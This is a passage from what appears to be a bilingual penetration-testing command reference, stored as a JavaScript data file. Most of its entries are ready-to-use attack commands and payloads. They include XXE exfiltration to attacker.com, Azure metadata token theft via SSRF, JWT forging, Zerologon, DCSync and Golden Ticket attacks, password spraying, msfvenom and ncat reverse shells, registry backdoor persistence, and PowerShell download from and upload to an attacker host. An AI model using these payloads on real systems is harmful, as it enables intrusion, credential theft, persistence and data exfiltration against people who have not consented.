      { name: { zh: '元数据攻击 (SSRF)', en: 'Metadata attack (SSRF)' }, command: '# Azure IMDS (需要 Metadata: true header)\ncurl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\ncurl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01', description: { zh: '通过 SSRF 利用 Azure 元数据服务', en: 'Exploit Azure metadata service via SSRF' }, platform: 'all' },
      { name: { zh: 'ROADtools 枚举', en: 'ROADtools enumeration' }, command: 'roadrecon auth -u user@domain.com -p password\nroadrecon gather\nroadrecon gui  # 启动可视化界面', description: { zh: 'Azure AD 深度枚举', en: 'Deep Azure AD enumeration' }, platform: 'all' }
    ],
    references: ['https://github.com/dirkjanm/ROADtools']
  },


  {
    id: 'web-cache-attacks',
    name: { zh: 'Web 缓存攻击工具', en: 'Web Cache Attack Tools' },
    description: { zh: 'Web 缓存投毒、缓存欺骗测试命令', en: 'Web cache poisoning and cache deception testing commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: '缓存投毒检测', en: 'Cache poisoning detection' }, command: "# 探测未键控 Header\ncurl -H 'X-Forwarded-Host: evil.com' https://target.com -I\ncurl -H 'X-Cache-Debug: 1' https://target.com -I\n# 观察 Age/Cache-Status 响应头", description: { zh: '检测 Web 缓存投毒可能性', en: 'Detect web cache poisoning potential' }, platform: 'all' },
      { name: { zh: 'Param Miner 扫描', en: 'Param Miner scan' }, command: '# Burp Suite 插件: Param Miner\n# 右键请求 -> Guess headers\n# 自动发现未键控参数', description: { zh: '使用 Param Miner 发现未键控参数', en: 'Use Param Miner to find unkeyed parameters' }, platform: 'all' },
      { name: { zh: '缓存欺骗测试', en: 'Cache deception test' }, command: 'curl https://target.com/account/profile.css -I\n# 如返回 200 且缓存了用户数据则存在漏洞\ncurl https://target.com/api/user/profile.css', description: { zh: '测试 Web 缓存欺骗漏洞', en: 'Test for web cache deception vulnerability' }, platform: 'all' }
    ],
    references: ['https://portswigger.net/research/practical-web-cache-poisoning']
  },
  {
    id: 'xxe-tools',
    name: { zh: 'XXE 攻击工具', en: 'XXE Attack Tools' },
    description: { zh: 'XXE 注入攻击 Payload 和利用命令', en: 'XXE injection attack payloads and exploitation commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: '基础 XXE', en: 'Basic XXE' }, command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>&xxe;</foo>", description: { zh: '基础文件读取 XXE', en: 'Basic file read XXE' }, platform: 'all' },
      { name: { zh: '带外 XXE (OOB)', en: 'Out-of-band XXE' }, command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n%dtd;\n]>\n<foo>&send;</foo>\n# evil.dtd 内容:\n# <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n# <!ENTITY % eval \"<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>\">\n# %eval;", description: { zh: '带外数据提取 XXE', en: 'Out-of-band data exfiltration XXE' }, platform: 'all' },
      { name: { zh: 'SSRF via XXE', en: 'SSRF via XXE' }, command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<foo>&xxe;</foo>", description: { zh: '通过 XXE 实现 SSRF', en: 'Achieve SSRF through XXE' }, platform: 'all' },
      { name: { zh: 'SVG XXE', en: 'SVG XXE' }, command: "<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [\n<!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n<text>&xxe;</text>\n</svg>", description: { zh: 'SVG 文件 XXE 注入', en: 'XXE injection via SVG file upload' }, platform: 'all' }
    ],
    references: ['https://portswigger.net/web-security/xxe']
  },
  {
    id: 'jwt-attacks',
    name: { zh: 'JWT 攻击工具', en: 'JWT Attack Tools' },
    description: { zh: 'JWT 令牌伪造、破解和注入攻击命令', en: 'JWT token forging, cracking, and injection attack commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip install jwt_tool / npm install -g jwt-cracker',
    commands: [
      { name: { zh: 'JWT 解码', en: 'Decode JWT' }, command: "# 在线: https://jwt.io\n# 命令行\necho 'eyJ...' | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool", description: { zh: 'Base64 解码 JWT Payload', en: 'Base64 decode JWT payload' }, platform: 'all' },
      { name: { zh: 'None 算法攻击', en: 'None algorithm attack' }, command: "python3 jwt_tool.py TOKEN -X a\n# 手动构造\nimport base64, json\nheader = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')\npayload = base64.b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')\nprint(f'{header}.{payload}.')", description: { zh: '攻击 alg=none JWT', en: 'Attack JWT with alg=none' }, platform: 'all' },
      { name: { zh: '密钥爆破', en: 'Secret brute force' }, command: 'hashcat -a 0 -m 16500 token.txt rockyou.txt\npython3 jwt_tool.py TOKEN -C -d wordlist.txt', description: { zh: '暴力破解 HMAC JWT 密钥', en: 'Brute force HMAC JWT secret key' }, platform: 'all' },
      { name: { zh: '公钥混淆攻击', en: 'Key confusion attack' }, command: 'python3 jwt_tool.py TOKEN -X k -pk public.pem\n# RS256 → HS256 混淆攻击', description: { zh: 'RS256 转 HS256 密钥混淆', en: 'RS256 to HS256 key confusion attack' }, platform: 'all' },
      { name: { zh: 'JWK 注入', en: 'JWK injection' }, command: "python3 jwt_tool.py TOKEN -X i\n# 在 Header 中注入 JWK\n# 构造自签名的公钥并注入", description: { zh: 'JWK Set 注入攻击', en: 'JWK Set injection attack' }, platform: 'all' }
    ],
    references: ['https://github.com/ticarpi/jwt_tool']
  },
  {
    id: 'active-directory-attacks',
    name: { zh: 'Active Directory 攻击速查', en: 'Active Directory Attack Quick Reference' },
    description: { zh: 'AD 域渗透攻击技术和工具命令速查', en: 'Quick reference for AD domain penetration attack techniques and commands' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    commands: [
      { name: { zh: 'Kerberoasting', en: 'Kerberoasting' }, command: '# impacket\nGetUserSPNs.py domain/user:pass -dc-ip dc_ip -request\n# PowerView\nGet-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat\n# Rubeus\nRubeus.exe kerberoast /format:hashcat /outfile:hashes.txt', description: { zh: 'Kerberoasting 获取服务账户票据哈希', en: 'Kerberoasting to get service account ticket hashes' }, platform: 'all' },
      { name: { zh: 'AS-REP Roasting', en: 'AS-REP Roasting' }, command: '# impacket\nGetNPUsers.py domain/ -dc-ip dc_ip -usersfile users.txt -format hashcat\n# Rubeus\nRubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt', description: { zh: 'AS-REP Roasting 攻击', en: 'AS-REP Roasting attack' }, platform: 'all' },
      { name: { zh: 'Zerologon (CVE-2020-1472)', en: 'Zerologon exploit' }, command: 'python3 zerologon_tester.py DC_NAME dc_ip\n# 利用\npython3 cve-2020-1472-exploit.py DC_NAME dc_ip', description: { zh: 'Zerologon 漏洞利用', en: 'Zerologon vulnerability exploitation' }, platform: 'linux' },
      { name: { zh: 'PrintNightmare', en: 'PrintNightmare exploit' }, command: '# CVE-2021-1675\npython3 CVE-2021-1675.py domain/user:pass@target "\\\\attacker\\share\\evil.dll"\n# 检测\nGet-Service Spooler', description: { zh: 'PrintNightmare 漏洞利用', en: 'PrintNightmare vulnerability exploitation' }, platform: 'all' },
      { name: { zh: 'DCSync 攻击', en: 'DCSync attack' }, command: '# Mimikatz\nlsadump::dcsync /domain:domain.com /all /csv\n# impacket\nsecretsdump.py domain/user:pass@dc_ip', description: { zh: 'DCSync 导出所有域哈希', en: 'DCSync to dump all domain hashes' }, platform: 'all' },
      { name: { zh: '黄金票据攻击', en: 'Golden Ticket attack' }, command: '# 需要 krbtgt 哈希\n# Mimikatz\nkerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt\n# 验证\ndir \\\\dc\\c$', description: { zh: '黄金票据权限持久化', en: 'Golden Ticket persistence attack' }, platform: 'windows' }
    ],
    references: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology']
  },


  {
    id: 'osint-tools',
    name: { zh: 'OSINT 信息收集工具', en: 'OSINT Information Gathering Tools' },
    description: { zh: 'OSINT 开源情报收集工具和技术命令', en: 'OSINT open-source intelligence gathering tools and technique commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'pip install shodan recon-ng / apt install maltego',
    commands: [
      { name: { zh: 'Shodan 搜索', en: 'Shodan search' }, command: 'shodan search "target.com" --fields ip_str,port,org\nshodan host target_ip\nshodan domain target.com\n# Web: https://www.shodan.io/', description: { zh: 'Shodan 资产发现', en: 'Shodan asset discovery' }, platform: 'all' },
      { name: { zh: 'Censys 搜索', en: 'Censys search' }, command: '# Web: https://search.censys.io/\ncensys search "target.com"\ncensys view 1.2.3.4', description: { zh: 'Censys 互联网资产扫描', en: 'Censys internet asset scanning' }, platform: 'all' },
      { name: { zh: 'Google Dork', en: 'Google Dork' }, command: 'site:target.com filetype:pdf\nsite:target.com inurl:admin\nsite:target.com ext:php inurl:?\nsite:target.com "password" filetype:log\nintitle:"index of" site:target.com', description: { zh: 'Google 高级搜索语法', en: 'Google advanced search syntax' }, platform: 'all' },
      { name: { zh: '邮箱收集', en: 'Email harvesting' }, command: 'theHarvester -d target.com -b google,bing,linkedin\n# hunter.io API\ncurl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY"', description: { zh: '收集目标邮箱地址', en: 'Collect target email addresses' }, platform: 'all' },
      { name: { zh: 'WHOIS 查询', en: 'WHOIS lookup' }, command: 'whois target.com\nwhois 1.2.3.4\n# amass 反向 WHOIS\namass intel -d target.com -whois', description: { zh: 'WHOIS 域名和 IP 注册信息', en: 'WHOIS domain and IP registration info' }, platform: 'all' },
      { name: { zh: 'Recon-ng', en: 'Recon-ng framework' }, command: 'recon-ng\n# 创建工作区\nworkspaces create target\n# 安装模块\nmarketplace install recon/domains-hosts/hackertarget\n# 运行模块\nmodules load recon/domains-hosts/hackertarget\noptions set SOURCE target.com\nrun', description: { zh: 'Recon-ng OSINT 框架', en: 'Recon-ng OSINT framework' }, platform: 'linux' },
      { name: { zh: 'Certificate 搜索', en: 'Certificate search' }, command: 'curl "https://crt.sh/?q=%.target.com&output=json" | python3 -m json.tool | grep name_value\n# 或直接访问 https://crt.sh/?q=%.target.com', description: { zh: '通过证书透明度发现子域名', en: 'Discover subdomains via certificate transparency' }, platform: 'all' }
    ],
    references: ['https://github.com/laramies/theHarvester', 'https://github.com/lanmaster53/recon-ng']
  },
  {
    id: 'exploit-dev-tools',
    name: { zh: '漏洞开发辅助工具', en: 'Exploit Development Helper Tools' },
    description: { zh: '二进制漏洞开发辅助工具命令集合', en: 'Binary exploit development helper tool commands' },
    category: { zh: 'CTF/PWN', en: 'CTF / PWN' },
    installation: 'pip install pwntools one_gadget / apt install nasm',
    commands: [
      { name: { zh: 'one_gadget', en: 'one_gadget' }, command: 'one_gadget /lib/x86_64-linux-gnu/libc.so.6\n# 在 Python 中使用\n# one_gadget_addr = libc_base + 0x4f432', description: { zh: '查找 libc 中的 one_gadget RCE', en: 'Find one_gadget RCE offsets in libc' }, platform: 'linux' },
      { name: { zh: 'checksec', en: 'checksec' }, command: 'checksec --file=./binary\n# 或 pwntools\npython3 -c "from pwn import *; e=ELF(\\"./binary\\"); print(e.checksec())"', description: { zh: '检查二进制保护机制', en: 'Check binary protection mechanisms' }, platform: 'linux' },
      { name: { zh: 'ROPgadget', en: 'ROPgadget' }, command: 'ROPgadget --binary ./binary --rop\nROPgadget --binary ./binary --string "/bin/sh"\nROPgadget --binary ./libc.so.6 --rop | grep "pop rdi"', description: { zh: '查找 ROP gadget', en: 'Find ROP gadgets in binary' }, platform: 'linux' },
      { name: { zh: 'ropper', en: 'ropper' }, command: 'ropper -f ./binary\nropper -f ./binary --search "pop rdi; ret"\nropper -f ./binary --chain "execve"', description: { zh: 'Ropper ROP 链分析', en: 'ROP chain analysis with Ropper' }, platform: 'linux' },
      { name: { zh: 'patchelf', en: 'patchelf' }, command: 'patchelf --set-interpreter /lib/ld-2.31.so ./binary\npatchelf --set-rpath /path/to/glibc ./binary\n# 常用于本地调试指定 libc 版本', description: { zh: '修改 ELF 解释器和 rpath', en: 'Patch ELF interpreter and rpath' }, platform: 'linux' },
      { name: { zh: 'nasm 汇编', en: 'nasm assembly' }, command: "echo 'BITS 64\nxor rdi,rdi\nmov rax,60\nsyscall' > exit.asm\nnasm -f bin exit.asm -o exit.bin\nxxd exit.bin", description: { zh: 'nasm 汇编和生成 shellcode', en: 'nasm assembly and shellcode generation' }, platform: 'linux' },
      { name: { zh: 'libc-database', en: 'libc-database' }, command: 'python3 find printf 0x7f...abc0 puts 0x7f...def0\n# 或在线: https://libc.blukat.me/\n./find printf 0xabc puts 0xdef', description: { zh: '通过 libc 函数地址识别版本', en: 'Identify libc version from function addresses' }, platform: 'linux' }
    ],
    references: ['https://github.com/david942j/one_gadget', 'https://github.com/JonathanSalwan/ROPgadget']
  },
  {
    id: 'openvas-vulnerability-scan',
    name: { zh: 'OpenVAS / Greenbone', en: 'OpenVAS / Greenbone Vulnerability Scanner' },
    description: { zh: '开源漏洞扫描器，覆盖网络资产全面漏洞检测', en: 'Open-source vulnerability scanner for comprehensive network asset vulnerability detection' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install openvas / sudo gvm-setup',
    commands: [
      { name: { zh: '初始化设置', en: 'Initial setup' }, command: 'gvm-setup\ngvm-check-setup\ngvm-start', description: { zh: '初始化并启动 GVM', en: 'Initialize and start GVM' }, platform: 'linux' },
      { name: { zh: '命令行扫描', en: 'CLI scan' }, command: 'gvm-cli --gmp-username admin --gmp-password pass socket --socketpath /var/run/gvmd.sock --xml "<get_tasks/>"', description: { zh: '通过 CLI 管理扫描任务', en: 'Manage scan tasks via CLI' }, platform: 'linux' },
      { name: { zh: 'Web 界面', en: 'Web interface' }, command: '# 访问 https://localhost:9392\n# 默认凭证: admin / (gvm-setup 生成的密码)', description: { zh: 'Greenbone Web 管理界面', en: 'Greenbone web management interface' }, platform: 'linux' }
    ],
    references: ['https://www.openvas.org/']
  },
  {
    id: 'password-spraying',
    name: { zh: '密码喷洒工具', en: 'Password Spraying Tools' },
    description: { zh: '针对 Web 应用和内网服务的密码喷洒攻击工具', en: 'Password spraying attack tools for web applications and internal network services' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'pip install sprayhound / gem install ruler',
    commands: [
      { name: { zh: 'O365 密码喷洒', en: 'O365 password spraying' }, command: 'python3 spray.py -U users.txt -p Password123 -ep https://login.microsoftonline.com\n# MSOLSpray\nImport-Module MSOLSpray.ps1\nInvoke-MSOLSpray -UserList users.txt -Password Winter2024!', description: { zh: 'Office 365 密码喷洒', en: 'Office 365 password spraying' }, platform: 'all' },
      { name: { zh: 'Kerbrute 喷洒', en: 'Kerbrute spraying' }, command: 'kerbrute passwordspray -d domain.com --dc dc_ip users.txt "Password123!"', description: { zh: 'Kerberos 密码喷洒', en: 'Kerberos password spraying' }, platform: 'all' },
      { name: { zh: 'SMB 密码喷洒', en: 'SMB password spraying' }, command: 'crackmapexec smb 192.168.1.0/24 -u users.txt -p "Password123!" --no-bruteforce --continue-on-success', description: { zh: 'SMB 协议密码喷洒', en: 'SMB protocol password spraying' }, platform: 'linux' },
      { name: { zh: 'Exchange 喷洒', en: 'Exchange spraying' }, command: 'python3 ruler.py --domain target.com spray --users users.txt --password "Password123!" --delay 0 --verbose', description: { zh: 'Exchange OWA 密码喷洒', en: 'Exchange OWA password spraying' }, platform: 'linux' }
    ],
    references: ['https://github.com/dafthack/MSOLSpray']
  },


  {
    id: 'scapy',
    name: 'Scapy',
    description: { zh: 'Python 网络包构造和分析库，用于自定义协议测试', en: 'Python packet crafting and analysis library for custom protocol testing' },
    category: { zh: 'CTF/流量分析', en: 'CTF / Traffic Analysis' },
    installation: 'pip install scapy',
    commands: [
      { name: { zh: '发送 ICMP 包', en: 'Send ICMP packet' }, command: "from scapy.all import *\nsend(IP(dst='target')/ICMP())", description: { zh: '发送自定义 ICMP 包', en: 'Send a custom ICMP packet' }, platform: 'linux' },
      { name: { zh: 'TCP SYN 扫描', en: 'TCP SYN scan' }, command: "from scapy.all import *\nans,_ = sr(IP(dst='target')/TCP(dport=[80,443,22],flags='S'),timeout=2)\nans.summary()", description: { zh: '构造 TCP SYN 数据包扫描', en: 'Craft TCP SYN packets for scanning' }, platform: 'linux' },
      { name: { zh: 'ARP 扫描', en: 'ARP scan' }, command: "from scapy.all import *\nans,_ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='192.168.1.0/24'),timeout=2)\nfor _,r in ans: print(r.psrc, r.hwsrc)", description: { zh: 'ARP 主机发现', en: 'ARP host discovery' }, platform: 'linux' },
      { name: { zh: '读取 PCAP', en: 'Read PCAP' }, command: "from scapy.all import *\npkts = rdpcap('capture.pcap')\nfor p in pkts:\n    if p.haslayer(Raw): print(p[Raw].load)", description: { zh: '读取和解析 PCAP 文件', en: 'Read and parse PCAP file' }, platform: 'all' },
      { name: { zh: 'DNS 查询', en: 'DNS query' }, command: "from scapy.all import *\nans = sr1(IP(dst='8.8.8.8')/UDP()/DNS(rd=1,qd=DNSQR(qname='target.com')))\nprint(ans[DNS].an)", description: { zh: '构造 DNS 查询请求', en: 'Craft a DNS query request' }, platform: 'linux' }
    ],
    references: ['https://scapy.readthedocs.io/']
  },
  {
    id: 'impacket-advanced',
    name: { zh: 'Impacket 高级工具', en: 'Impacket Advanced Tools' },
    description: { zh: 'Impacket 框架高级工具集：SMB、Kerberos、LDAP、数据库操作', en: 'Impacket framework advanced tools: SMB, Kerberos, LDAP, and database operations' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip install impacket',
    commands: [
      { name: { zh: 'Kerberos TGT 申请', en: 'Request Kerberos TGT' }, command: 'getTGT.py domain/user:password\ngetTGT.py domain/user -hashes :NTLM_HASH\nexport KRB5CCNAME=user.ccache', description: { zh: '申请 Kerberos TGT 票据', en: 'Request a Kerberos TGT ticket' }, platform: 'linux' },
      { name: { zh: 'Kerberos ST 申请', en: 'Request service ticket' }, command: 'getST.py -spn cifs/server.domain.com domain/user:password\ngetST.py -spn cifs/server.domain.com -impersonate Administrator domain/service_user:password', description: { zh: '申请服务票据', en: 'Request a Kerberos service ticket' }, platform: 'linux' },
      { name: { zh: 'LDAP 枚举', en: 'LDAP enumeration' }, command: 'ldapdomaindump domain/user:password@dc_ip\nldapsearch -x -H ldap://dc_ip -D "user@domain.com" -w password -b "DC=domain,DC=com"', description: { zh: 'LDAP 域信息枚举', en: 'Enumerate domain information via LDAP' }, platform: 'linux' },
      { name: { zh: 'reg.py 注册表', en: 'Registry operations' }, command: 'reg.py domain/user:password@target query -keyName "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"\nreg.py domain/user:password@target save -keyName "HKLM\\SAM" -o /tmp/sam', description: { zh: '远程读取注册表', en: 'Remote registry operations' }, platform: 'linux' },
      { name: { zh: 'ticketer.py 票据', en: 'Create Kerberos ticket' }, command: 'ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.com Administrator\n# 生成黄金票据', description: { zh: '创建黄金/白银票据', en: 'Create golden/silver Kerberos ticket' }, platform: 'linux' }
    ],
    references: ['https://github.com/fortra/impacket']
  },


  {
    id: 'netcat-advanced',
    name: { zh: 'Netcat 高级用法', en: 'Netcat Advanced Usage' },
    description: { zh: 'Netcat 网络工具高级用法：文件传输、端口扫描、代理', en: 'Advanced Netcat usage: file transfer, port scanning, and proxy' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    installation: 'apt install netcat-openbsd',
    commands: [
      { name: { zh: '文件传输', en: 'File transfer' }, command: '# 接收端\nnc -lvnp 4444 > received_file\n# 发送端\nnc target 4444 < file_to_send', description: { zh: '使用 Netcat 传输文件', en: 'Transfer files using Netcat' }, platform: 'linux' },
      { name: { zh: '端口扫描', en: 'Port scan' }, command: 'nc -zv target 20-1024 2>&1 | grep succeeded\nnc -z -w1 target 80', description: { zh: '使用 Netcat 扫描端口', en: 'Port scanning with Netcat' }, platform: 'linux' },
      { name: { zh: 'Banner 抓取', en: 'Banner grabbing' }, command: 'echo "" | nc -w1 target 80\necho "HEAD / HTTP/1.0\r\n\r\n" | nc target 80', description: { zh: '抓取服务 Banner 信息', en: 'Grab service banner information' }, platform: 'linux' },
      { name: { zh: '加密 Shell (ncat)', en: 'Encrypted shell (ncat)' }, command: '# 监听端 (SSL)\nncat --ssl -lvnp 4444\n# 连接端\nncat --ssl attacker 4444 -e /bin/bash', description: { zh: 'SSL 加密的反弹 Shell', en: 'SSL-encrypted reverse shell' }, platform: 'linux' },
      { name: { zh: '聊天服务器', en: 'Simple chat server' }, command: '# 服务端\nnc -lvnp 4444\n# 客户端\nnc server_ip 4444', description: { zh: '用 Netcat 建立简单通信', en: 'Simple communication using Netcat' }, platform: 'linux' }
    ],
    references: ['https://man.cx/nc']
  },
  {
    id: 'metasploit-advanced',
    name: { zh: 'Metasploit 高级用法', en: 'Metasploit Advanced Usage' },
    description: { zh: 'Metasploit 高级功能：后渗透、持久化、数据库集成', en: 'Metasploit advanced features: post-exploitation, persistence, database integration' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'apt install metasploit-framework',
    commands: [
      { name: { zh: '数据库初始化', en: 'Database setup' }, command: 'msfdb init\nmsfdb start\ndb_status', description: { zh: '初始化 MSF 数据库', en: 'Initialize MSF database' }, platform: 'linux' },
      { name: { zh: 'Nmap 集成扫描', en: 'Integrated Nmap scan' }, command: 'db_nmap -sV -sC -p- target\nhosts\nservices', description: { zh: '使用 db_nmap 扫描并存库', en: 'Scan with db_nmap and store results' }, platform: 'linux' },
      { name: { zh: '会话管理', en: 'Session management' }, command: 'sessions -l\nsessions -i 1\nsessions -u 1  # 升级到 Meterpreter\nbackground', description: { zh: 'MSF 会话管理命令', en: 'MSF session management commands' }, platform: 'linux' },
      { name: { zh: 'Meterpreter 后渗透', en: 'Meterpreter post-exploitation' }, command: 'run post/multi/recon/local_exploit_suggester\nrun post/windows/gather/credentials/credential_collector\nrun post/multi/manage/shell_to_meterpreter', description: { zh: 'Meterpreter 后渗透模块', en: 'Meterpreter post-exploitation modules' }, platform: 'linux' },
      { name: { zh: 'Persistence 持久化', en: 'Persistence module' }, command: 'run post/windows/manage/persistence_exe STARTUP=SCHEDULER\nrun post/linux/manage/cron_persistence', description: { zh: 'MSF 持久化模块', en: 'MSF persistence modules' }, platform: 'linux' },
      { name: { zh: 'msfvenom 各格式', en: 'msfvenom formats' }, command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f exe -o payload.exe\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -f elf -o shell\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f raw -o shell.php\nmsfvenom -p java/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f war -o shell.war', description: { zh: '各语言平台的 Payload 生成', en: 'Generate payloads for various platforms and languages' }, platform: 'linux' }
    ],
    references: ['https://docs.metasploit.com/']
  },
  {
    id: 'windows-registry',
    name: { zh: 'Windows 注册表命令', en: 'Windows Registry Commands' },
    description: { zh: 'Windows 注册表查询、修改和安全相关操作命令', en: 'Windows registry query, modification, and security-related operation commands' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '查询注册表', en: 'Query registry' }, command: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services', description: { zh: '查询常用注册表键', en: 'Query common registry keys' }, platform: 'windows' },
      { name: { zh: '搜索凭证', en: 'Search credentials' }, command: 'reg query HKLM /f "password" /t REG_SZ /s\nreg query HKCU /f "password" /t REG_SZ /s\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', description: { zh: '搜索注册表中的密码', en: 'Search registry for passwords' }, platform: 'windows' },
      { name: { zh: '持久化键', en: 'Persistence registry keys' }, command: 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d "C:\\backdoor.exe" /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d "C:\\backdoor.exe" /f', description: { zh: '注册表持久化启动项', en: 'Registry-based persistence startup entries' }, platform: 'windows' },
      { name: { zh: 'AlwaysInstallElevated', en: 'AlwaysInstallElevated check' }, command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: { zh: '检测 AlwaysInstallElevated 提权', en: 'Check for AlwaysInstallElevated privilege escalation' }, platform: 'windows' },
      { name: { zh: '凭证存储', en: 'Stored credentials' }, command: 'cmdkey /list\ncredentialmanager.exe\n# Mimikatz: vault::cred', description: { zh: '列出 Windows 凭证管理器', en: 'List Windows Credential Manager entries' }, platform: 'windows' }
    ],
    references: ['https://ss64.com/nt/reg.html']
  },
  {
    id: 'powershell-remoting',
    name: { zh: 'PowerShell 远程管理', en: 'PowerShell Remoting Commands' },
    description: { zh: 'PowerShell 远程管理和 WinRM 配置命令', en: 'PowerShell remoting and WinRM configuration commands' },
    category: { zh: 'Windows渗透', en: 'Windows Penetration' },
    commands: [
      { name: { zh: '启用 PS Remoting', en: 'Enable PS Remoting' }, command: 'Enable-PSRemoting -Force\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value "*"', description: { zh: '启用 PowerShell 远程管理', en: 'Enable PowerShell remoting' }, platform: 'windows' },
      { name: { zh: '建立远程会话', en: 'Create remote session' }, command: '$sess = New-PSSession -ComputerName target -Credential (Get-Credential)\nEnter-PSSession $sess\nInvoke-Command -Session $sess -ScriptBlock { whoami }', description: { zh: '创建和使用远程 PS 会话', en: 'Create and use remote PS sessions' }, platform: 'windows' },
      { name: { zh: '远程执行命令', en: 'Remote command execution' }, command: 'Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { Get-Process }\nInvoke-Command -ComputerName target -FilePath C:\\script.ps1', description: { zh: '在远程主机执行命令', en: 'Execute commands on remote host' }, platform: 'windows' },
      { name: { zh: '传输文件', en: 'File transfer via PS' }, command: '# 下载\nInvoke-WebRequest "http://attacker/file.exe" -OutFile "C:\\temp\\file.exe"\n(New-Object Net.WebClient).DownloadFile("http://attacker/file.exe","C:\\file.exe")\n# 上传\n$b=[System.IO.File]::ReadAllBytes("C:\\file.txt")\nInvoke-WebRequest -Uri "http://attacker/upload" -Method POST -Body $b', description: { zh: 'PowerShell 文件传输', en: 'PowerShell file transfer methods' }, platform: 'windows' }
    ],
    references: ['https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting']
  },
  {
    id: 'linux-networking-commands',
    name: { zh: 'Linux 网络命令速查', en: 'Linux Networking Quick Reference' },
    description: { zh: 'Linux 网络配置、诊断和安全相关命令速查', en: 'Linux network configuration, diagnostics, and security command quick reference' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '接口和路由', en: 'Interfaces and routes' }, command: 'ip addr show\nip route show\nip neigh show\nss -tlnp', description: { zh: '查看网络接口、路由和连接', en: 'Show network interfaces, routes, and connections' }, platform: 'linux' },
      { name: { zh: 'DNS 排查', en: 'DNS troubleshooting' }, command: 'dig target.com A +short\ndig target.com MX\nnslookup target.com 8.8.8.8\nresolvectl status', description: { zh: 'DNS 解析查询和排查', en: 'DNS resolution queries and troubleshooting' }, platform: 'linux' },
      { name: { zh: '防火墙状态', en: 'Firewall status' }, command: 'iptables -L -n -v\nnft list ruleset\nufw status verbose\nfirewall-cmd --list-all', description: { zh: '查看防火墙规则', en: 'View firewall rules' }, platform: 'linux' },
      { name: { zh: '流量捕获', en: 'Traffic capture' }, command: 'tcpdump -i any -nn port 80 -w out.pcap\ntcpdump -i eth0 host 10.0.0.1 and port 443\ntcpdump -i any -A -s0 port 8080', description: { zh: '网络流量捕获', en: 'Network traffic capture' }, platform: 'linux' },
      { name: { zh: '端口转发', en: 'Port forwarding' }, command: 'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080\nsocat TCP-LISTEN:8080,fork TCP:target:80', description: { zh: 'iptables/socat 端口转发', en: 'Port forwarding with iptables/socat' }, platform: 'linux' }
    ],
    references: ['https://man7.org/linux/man-pages/']
  },


  {
    id: 'ctf-web-tools',
    name: { zh: 'CTF Web 工具集', en: 'CTF Web Tools' },
    description: { zh: 'CTF Web 题常用工具和 Payload 命令', en: 'Common tools and payload commands for CTF web challenges' },
    category: { zh: 'CTF/Web', en: 'CTF / Web' },
    commands: [
